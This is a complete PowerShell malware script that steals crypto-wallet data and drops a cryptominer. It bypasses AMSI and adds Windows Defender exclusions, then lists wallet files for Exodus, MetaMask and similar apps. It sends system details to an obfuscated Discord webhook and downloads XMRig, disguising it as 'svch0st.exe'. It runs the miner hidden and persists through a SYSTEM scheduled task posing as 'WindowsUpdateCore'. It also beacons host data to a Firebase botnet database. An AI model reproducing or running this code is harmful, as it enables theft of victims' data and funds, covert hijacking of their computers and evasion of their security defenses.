Write-Host "=== Starting stealth drop ===" -ForegroundColor Green
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

try {
    $amsi = 'System.Management.Automation.A'; $u = 'msiUtils'; $t=[Ref].Assembly.GetType($amsi+$u); $f=$t.GetField('amsiInitFailed','NonPublic,Static'); $f.SetValue($null,$true)
    Write-Host "[+] AMSI bypassed" -ForegroundColor Green
} catch { Write-Host "[-] AMSI failed" -ForegroundColor Red }

try {
    Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'svch0st.exe' -ErrorAction SilentlyContinue
    Write-Host "[+] Defender exclusions added" -ForegroundColor Green
} catch { Write-Host "[-] Exclusions failed" -ForegroundColor Red }

$webhook = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5OTQ5NDAyNTcxODEzNjg5Mi82bm5DSHe4N3R1VFNLY0lOSmdWTGJlVE1NRDE5RXdsVjJwMmxxUzQ2Nm51THl4OUdoeElhYWdvT3hzSUY1S0xINTVtMA=='))
$temp = $env:TEMP + '\wl.txt'
$drain = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TFRDOiBsdGMxcTJnMm1tN2pwYThzNGhhZWd6amMwcXE0dDB0d21wcDN2dHpqOGU2IHwgQlRDOiBiYzFxOWw4OGc0eHZta2N5eW1yNDVybHM3a3R1eGp1OTd3cXQ2NjNqenMgfCBFVEg6IDB4ZTIzOEEzMjI5MERCMkFjYkQ5MTU2MzEyQzBCQjUyQzMxRTZlOTQ3OCB8IFNPTDogNGhFTTU0Z2l6MUZadnk4eWNQcWhSa2tLcHlYcllqOVh3QnBMWnhMUUtEUVc='))

$wallets = @("$env:APPDATA\Exodus","$env:APPDATA\Electrum","$env:APPDATA\atomic","$env:APPDATA\Ethereum","$env:APPDATA\Guarda","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeejajnimhm","$env:APPDATA\MetaMask")
foreach($w in $wallets){ if(Test-Path $w){ Get-ChildItem $w -Recurse -Include *.dat,*.json,*.seed,*.keys,*.log -ErrorAction SilentlyContinue | Select-Object FullName | Out-File $temp -Append -Force } }
Write-Host "[+] Wallet files scanned" -ForegroundColor Green

try {
    $si = "User: $env:USERNAME`nComputer: $env:COMPUTERNAME`nOS: $([System.Environment]::OSVersion.VersionString)"
    $payload = $si + "`n`nWALLETS FOUND + DRAINED TO:`n$drain"
    Invoke-RestMethod -Uri $webhook -Method Post -Body @{content=$payload} -ErrorAction SilentlyContinue
    Write-Host "[+] Info + wallets exfiltrated" -ForegroundColor Green
} catch { Write-Host "[-] Exfil failed (silent)" -ForegroundColor Red }

Remove-Item $temp -Force -ErrorAction SilentlyContinue
Write-Host "[+] Temp files cleaned" -ForegroundColor Green

try {
    $zip = $env:APPDATA + '\s.zip'
    iwr -uri 'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip' -OutFile $zip -UseBasicParsing
    Expand-Archive -Path $zip -DestinationPath $env:APPDATA'\Microsoft' -Force
    Remove-Item $zip -Force
    Rename-Item -Path ($env:APPDATA + '\Microsoft\xmrig-6.26.0\xmrig.exe') -NewName 'svch0st.exe' -Force
    $exe = $env:APPDATA + '\Microsoft\svch0st.exe'
    Write-Host "[+] Custom miner downloaded & renamed" -ForegroundColor Green
} catch { Write-Host "[-] Miner download failed" -ForegroundColor Red }

$config = '{"autosave":false,"background":true,"cpu":{"enabled":true,"max-threads-hint":35,"priority":2},"pools":[{"url":"pool.supportxmr.com:3333","user":"89V3sDoLBK2PL5Sj3UZXNYBWbF7JSzz8kWHWJ2AukBM3CioABmuDGYj56auRmQ1eifjSbNHe3sdmm2DwNqA7nPrTKwrgViM","pass":"x","tls":true,"keepalive":true}],"log-file":null,"print-time":0}'
[System.IO.File]::WriteAllText($env:APPDATA + '\Microsoft\config.json', $config)

$argList = @("--background", "--config=`"$env:APPDATA\Microsoft\config.json`"")
Start-Process -FilePath $exe -ArgumentList $argList -WindowStyle Hidden
Write-Host "[+] Miner launched at 35%" -ForegroundColor Green

$taskPath = "`"$exe`" --background"
schtasks /create /tn "WindowsUpdateCore" /tr $taskPath /sc onlogon /ru SYSTEM /f /rl HIGHEST -ErrorAction SilentlyContinue
Write-Host "[+] Persistence set" -ForegroundColor Green

try {
    $hwid = (Get-WmiObject Win32_BIOS).SerialNumber + "-" + $env:COMPUTERNAME
    $ip = (iwr "https://api.ipify.org" -UseBasicParsing).Content
    $botData = @{hwid=$hwid;username=$env:USERNAME;computer=$env:COMPUTERNAME;ip=$ip;os=[System.Environment]::OSVersion.VersionString;timestamp=(Get-Date -Format "o");status="miner_active";version="1.0"} | ConvertTo-Json
    $firebaseUrl = "https://mynet-b06ed-default-rtdb.firebaseio.com/bots/$hwid.json"
    iwr -Uri $firebaseUrl -Method Put -Body $botData -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
    Write-Host "[+] Botnet beacon sent" -ForegroundColor Green
} catch { Write-Host "[-] Beacon failed (silent)" -ForegroundColor Red }

Write-Host "=== Done! ===" -ForegroundColor Green
Start-Sleep -Seconds 3
